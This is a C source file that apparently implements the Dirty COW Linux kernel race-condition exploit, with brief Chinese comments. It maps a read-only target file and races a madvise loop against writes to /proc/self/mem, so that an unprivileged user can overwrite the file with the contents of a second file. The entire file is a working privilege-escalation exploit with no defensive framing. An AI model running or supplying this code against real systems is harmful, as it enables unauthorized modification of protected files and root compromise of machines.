#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>

//DrityCow
void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {

    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;

  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {

    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{

  if (argc<3)return 1;
  pthread_t pth1,pth2;
  FILE *tempFile = 0;
  int tempFileSize = 0;
  char *tempFileData = 0;

  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];

  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  if (MAP_FAILED == map){
      printf("file map fail, errno(%d)\n", errno);
      return 0;
  }
  
  //读取要写入的内容
  tempFile = fopen(argv[2], "rb");
  if (0 == tempFile){
      printf("(%s) file read fail\n", argv[2]);
      return 0;
  }
  //获取文件大小
  fseek(tempFile, 0, SEEK_END);
  tempFileSize = ftell(tempFile);
  //再还原文件指针位置
  fseek(tempFile, 0, SEEK_SET);
  //动态创建内存
  tempFileData = (char *)malloc(tempFileSize);
  //读取文件内容
  memset(tempFileData, 0, tempFileSize);
  fread(tempFileData, 1, tempFileSize, tempFile);

  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,tempFileData);

  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  //回收资源
  free(tempFileData);
  fclose(tempFile);
  return 0;
}
